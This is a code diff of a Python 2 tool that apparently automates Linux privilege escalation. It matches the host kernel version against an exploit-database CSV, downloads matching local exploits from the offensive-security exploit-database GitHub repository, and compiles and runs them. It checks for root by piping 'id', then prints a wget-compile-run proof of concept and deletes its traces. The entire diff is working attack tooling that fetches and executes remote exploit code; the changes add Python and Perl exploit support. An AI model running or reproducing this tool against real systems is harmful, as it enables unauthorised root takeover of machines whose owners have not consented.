@@ -15,8 +15,9 @@ DB = "files.csv"
 END = False
 
 
-def run(exploit, url_opener):
+def process_exploit(exploit, url_opener):
     filename = exploit['file'][exploit['file'].rindex('/') + 1:]
+    files_to_delete = [filename]
     try:
         global END
         exploit_url = "https://raw.githubusercontent.com/offensive-security/exploit-database/master/" + exploit['file']
@@ -24,29 +25,35 @@ def run(exploit, url_opener):
 
         if END:
             return
+        print 'Running exploit [%s] [%s]' % (filename, exploit['description'])
         if filename.endswith('.c'):
-            if len(exploit['description']) > 65:
-                print 'Running exploit [%s] [%s]' % (filename[:-2], exploit['description'][:65])
-            else:
-                print 'Running exploit [%s] [%s]' % (filename[:-2], exploit['description'])
-            compile_cmd = 'gcc %s -o %s -lpthread -pthread -lcrypt -lssl -ldl' % (filename, filename[:-2])
+            compile_cmd = 'gcc %s -o %s -lpthread -pthread -lcrypt -lssl -ldl; ' % (filename, filename[:-2])
             run_command(compile_cmd)
             if os.path.exists(filename[:-2]):
-                run_exploit = "./%s" % filename[:-2]
-                i, o, e = os.popen3(run_exploit, 'r')
-                i.write('id\n')
-                i.close()
-                read = o.read()
-                if 'uid=0(root) gid=0(root)' in read:
-                    print '\nGot root!!\nID: [%s], PoC:\nwget %s --no-check-certificate; %s; %s;\n%s' % (
-                        filename[:-2], exploit_url, compile_cmd, run_exploit, read)
-                    END = True
-                    sys.exit()
-                o.close()
+                files_to_delete.append(filename[:-2])
+                run_exploit(compile_cmd, exploit_url, filename, "./%s" % filename[:-2])
+        elif filename.endswith('.py'):
+            run_exploit('', exploit_url, filename, "python %s" % filename)
+        elif filename.endswith('.pl'):
+            run_exploit('', exploit_url, filename, "perl %s" % filename)
+
     except Exception:
         pass
-    run_command('rm %s' % filename)
-    run_command('rm %s' % filename[:-2])
+    for file in files_to_delete:
+        run_command('rm %s' % file)
+
+
+def run_exploit(compile_cmd, exploit_url, filename, exploit_cmd):
+    global END
+    i, o, e = os.popen3(exploit_cmd, 'r')
+    i.write('id\n')
+    i.close()
+    read = o.read()
+    if 'uid=0(root) gid=0(root)' in read:
+        print '\nGot root!!\nID: [%s], PoC:\nwget %s --no-check-certificate; %s%s;\n%s' % (filename[:-2], exploit_url, compile_cmd, exploit_cmd, read)
+        END = True
+        sys.exit()
+    o.close()
 
 
 def run_command(compile_cmd):
@@ -78,7 +85,7 @@ def run_escalator(ur_lopener=urllib.URLopener()):
         if END:
             os._exit(0)
         if (row['platform'].lower() == kernel['os'] or row['platform'].lower() == 'lin_x86') and row['type'] == 'local' and kernel['version'] in row['description'].lower():
-            threading.Thread(target=run, args=[row, ur_lopener]).start()
+            threading.Thread(target=process_exploit, args=[row, ur_lopener]).start()
             time.sleep(0.8)
 
 
